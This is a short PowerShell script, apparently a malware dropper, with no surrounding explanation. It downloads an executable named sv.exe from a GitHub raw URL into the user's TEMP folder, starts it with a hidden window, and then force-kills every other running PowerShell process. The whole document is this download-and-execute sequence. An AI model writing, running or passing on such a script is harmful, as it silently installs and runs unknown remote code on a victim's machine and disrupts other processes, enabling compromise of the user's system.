$exeUrl="https://github.com/skailol/ps1/raw/main/sv.exe"
$exePath="$env:TEMP\sv.exe"
(New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)
Start-Process -FilePath $exePath -WindowStyle Hidden
Get-Process -Name powershell | Where-Object { $_.Id -ne $PID } | ForEach-Object { Stop-Process -Id $_.Id -Force }
